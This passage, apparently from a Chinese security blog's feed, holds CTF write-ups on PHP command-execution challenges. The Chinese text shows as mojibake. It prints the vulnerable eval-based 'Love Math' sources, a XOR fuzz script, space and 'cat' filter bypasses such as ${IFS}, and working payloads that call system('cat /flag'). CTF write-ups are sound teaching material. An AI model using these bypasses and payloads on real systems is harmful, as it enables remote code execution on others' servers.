class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¥—å¨ƒé¢˜ï¼Œä¸€å±‚ä¸€å±‚çš„æ¥çœ‹ã€‚</p><p>ç¬¬ä¸€å±‚æ˜¯ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡intvalå‡½æ•°çš„ifåˆ¤æ–­ï¼Œç»™ä¸€ä¸ªdemo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;3e4&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval($a);</span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">$b=<span class="string">&quot;3e4&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval($b+<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 30001</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å› ä¸ºè¿›è¡Œ+1æ“ä½œçš„æ—¶å€™ä¼šå…ˆå°†$açš„ç§‘å­¦è®¡æ•°æ³•è§£æç„¶åå†åŠ 1ã€‚</p><blockquote><p>ä»¥ä¸‹åªé€‚åˆphp7.0åŠä»¥ä¸‹ç‰ˆæœ¬</p></blockquote><p>ç¬¬äºŒå±‚æ˜¯md5çš„å¼±æ¯”è¾ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br><span class="line">md5å€¼ï¼š0e291242476940776845150308577824</span><br><span class="line">0e2159620</span><br><span class="line">md5å€¼ï¼š0e2159620</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å±‚æ˜¯ç»•è¿‡ç©ºæ ¼å’Œcatå‘½ä»¤ï¼Œç©ºæ ¼çš„ä»£æ›¿æ–¹å¼<code>$&#123;IFS&#125;</code>ã€<code>$IFS</code>ï¼Œcatçš„ä»£æ›¿æ–¹å¼<code>ca\t</code>ã€<code>sort</code>ã€<code>more</code>ç­‰ç­‰ã€‚</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-love-math">CISCN2019 ååŒ—èµ›åŒº love math</h2><h3 id="è€ƒç‚¹-v8">è€ƒç‚¹</h3><ul><li>ä»£ç å®¡è®¡</li></ul><h3 id="è§£é¢˜-v8">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å®¡è®¡">å®¡è®¡</h4><p>å¯ä»¥çœ‹åˆ°ä»£ç å¯¹äºæˆ‘ä»¬çš„ä¼ å‚è¿›è¡Œäº†å¦‚ä¸‹é™åˆ¶ï¼š</p><ol><li><p>é•¿åº¦é™åˆ¶&lt;80</p></li><li><p>é»‘åå•ç‰¹æ®Šå­—ç¬¦é™åˆ¶</p></li><li><p>æ­£åˆ™åŒ¹é…å­—ç¬¦é€šè¿‡ç™½åå•éªŒè¯ï¼Œæ¯”å¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abs(1)èƒ½è¿‡</span><br><span class="line">1abs()èƒ½è¿‡</span><br><span class="line">absa()ä¸èƒ½è¿‡</span><br><span class="line">abs(a)ä¸èƒ½è¿‡</span><br><span class="line">abs()aä¸èƒ½è¿‡</span><br></pre></td></tr></table></figure></li></ol><p>å…¶ä¸­æ­£åˆ™åŒ¹é…å­—ç¬¦ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs); </span><br></pre></td></tr></table></figure><p>æ˜¯å°†<code>$content</code>å˜é‡ä¸­ä»¥å­—æ¯å¼€å¤´çš„å­—ç¬¦ä¸²ç»„æˆæ•°ç»„å‚¨å­˜åœ¨<code>$used_funcs</code>å˜é‡ä¸­ã€‚</p><p>æŸ¥çœ‹<code>$whitelist</code>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªè¿›åˆ¶è½¬æ¢å‡½æ•°ï¼š</p><blockquote><ul><li>base_convert()ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ï¼ˆ2 - 32 è¿›åˆ¶)ã€‚</li><li>dechex()ï¼šæŠŠåè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ã€‚</li></ul></blockquote><p>æˆ‘ä»¬çŸ¥é“<code>32è¿›åˆ¶</code>åŒ…æ‹¬<code>0-9a-z</code>ç­‰å­—ç¬¦ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>base_convert()</code>å‡½æ•°åˆ©ç”¨è¿›åˆ¶è½¬æ¢æ„é€ ç‰¹å®šçš„å­—ç¬¦ä¸²ã€‚</p><h4 id="æ„é€ payload">æ„é€ payload</h4><h5 id="æ–¹æ³•ä¸€">æ–¹æ³•ä¸€</h5><p>ç”±äºé•¿åº¦çš„é™åˆ¶ï¼Œè‚¯å®šæ˜¯è¦æ„é€ <code>&#123;$_GET&#125;&#123;xx&#125;(&#123;$_GET&#125;&#123;yy&#125;)</code>æ¥æ‰§è¡Œshellã€‚</p><blockquote><p><code>hex2bin() å‡½æ•°</code>ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚</p></blockquote><p>é¦–å…ˆæŠŠ<code>$_GET</code>è½¬æ¢ä¸º10è¿›åˆ¶è¡¨ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>int(binascii.b2a_hex(<span class="string">b&#x27;_GET&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"><span class="number">1598506324</span></span><br></pre></td></tr></table></figure><p>å†åˆ©ç”¨<code>base_convert</code>å‡½æ•°æ„é€ <code>hex2bin</code>å‡½æ•°ï¼š</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703115033.png" style="zoom:67%;" /><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(base_convert(37907361743, 10, 36));</span><br><span class="line">string(7) &quot;hex2bin&quot;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œæˆ‘ä»¬å°±åˆ©ç”¨<code>dechex</code>å‡½æ•°æŠŠ10è¿›åˆ¶è¡¨ç¤ºçš„<code>$_GET</code>è½¬æ¢ä¸º16è¿›åˆ¶è¡¨ç¤ºï¼Œç„¶åä¼ å…¥<code>hex2bin()</code>å‡½æ•°ã€‚</p><p>æ‰€ä»¥æœ€åçš„payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><blockquote><p>å¦å¤–ä¸€ç§å½¢å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$&#123;$pi&#125;&#123;pi&#125;($&#123;$pi&#125;&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</span><br></pre></td></tr></table></figure></blockquote><h5 id="æ–¹æ³•äºŒ">æ–¹æ³•äºŒ</h5><p>é€šè¿‡<code>getallheaders()</code>å‡½æ•°ï¼Œè¯»å–å†™å…¥HTTP request headerå­—æ®µçš„å€¼ã€‚</p><p>payloadçš„æ„é€ æ–¹å¼å’Œä¸Šé¢ä¸€æ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure><p>è§£é‡Šå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">base_convert(696468,10,36) &#x3D;&gt; &quot;exec&quot;</span><br><span class="line">$pi(8768397090111664438,10,30) &#x3D;&gt; &quot;getallheaders&quot;</span><br><span class="line">exec(getallheaders()&#123;1&#125;)</span><br><span class="line">&#x2F;&#x2F;æ“ä½œxxå’Œyyï¼Œä¸­é—´ç”¨é€—å·éš”å¼€ï¼Œechoéƒ½èƒ½è¾“å‡º</span><br><span class="line">echo xx,yy</span><br></pre></td></tr></table></figure><h2 id="NESTCTF2019-Love-Math2">NESTCTF2019 Love Math2</h2><h3 id="è€ƒç‚¹-v9">è€ƒç‚¹</h3><ul><li>ä»£ç å®¡è®¡</li><li>Fuzz</li></ul><h3 id="è§£é¢˜-v9">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);</span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œä¸Šé¢çš„é‚£é“é¢˜åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯é™åˆ¶æ›´ä¸ºä¸¥æ ¼ï¼Œå‚æ•°é•¿åº¦å¿…é¡»å°äº60ï¼Œæ‰€ä»¥é‚£é“é¢˜çš„ä¸¤ä¸ªæ–¹æ³•éƒ½ä¸èƒ½ç”¨ï¼Œè¿™é‡Œå†ä»‹ç»ä¸€ç§Fuzzçš„è„šæœ¬ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>($k=<span class="number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">            <span class="keyword">echo</span>($payload[$k].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦ç›®çš„å°±æ˜¯æƒ³fuzzå‡º<code>_GET</code>å­—ç¬¦ä¸²ã€‚å¯ä»¥æŠŠè¿™ä¸ªå­—ç¬¦ä¸²æ‹†åˆ†æˆä¸¤æ®µã€‚å…ˆæŸ¥æ‰¾<code>_G</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ php fuzz.php | grep _G</span><br><span class="line">is_finite^64&#x3D;&#x3D;&gt;_G</span><br><span class="line">is_infinite^64&#x3D;&#x3D;&gt;_G</span><br><span class="line">is_nan^64&#x3D;&#x3D;&gt;_G</span><br><span class="line">mt_getrandmax^23&#x3D;&#x3D;&gt;_G</span><br><span class="line">mt_rand^23&#x3D;&#x3D;&gt;_G</span><br><span class="line">mt_srand^23&#x3D;&#x3D;&gt;_G</span><br></pre></td></tr></table></figure><p>å†æ¥æŸ¥æ‰¾<code>ET</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ php fuzz.php | grep ET</span><br><span class="line">rad2deg^75&#x3D;&#x3D;&gt;ET</span><br><span class="line">rand^75&#x3D;&#x3D;&gt;ET</span><br><span class="line">tan^15&#x3D;&#x3D;&gt;ET</span><br><span class="line">tanh^15&#x3D;&#x3D;&gt;ET</span><br></pre></td></tr></table></figure><p>é€‰æ‹©å‡½æ•°åæœ€çŸ­çš„å³å¯ã€‚æœ€ç»ˆçš„payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><blockquote><p>æˆ–è€…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag</span><br></pre></td></tr></table></figure></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GXYCTF2019-Ping-Ping-Ping&quot;&gt;GXYCTF2019 Ping Ping Ping&lt;/h2&gt;
&lt;h3 id=&quot;TODO&quot;&gt;TODO&lt;/h3&gt;
&lt;h2 id=&quot;ACTF2020-æ–°ç”Ÿèµ›-Exec&quot;&gt;ACTF2020 æ–°ç”Ÿèµ› Exec&lt;/h2&gt;

      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="å‘½ä»¤æ‰§è¡Œ" scheme="http://ca0y1h.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”SQLæ³¨å…¥</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-08-18T09:58:19.000Z</published>
    <updated>2020-09-17T08:37:26.193Z</updated>
    
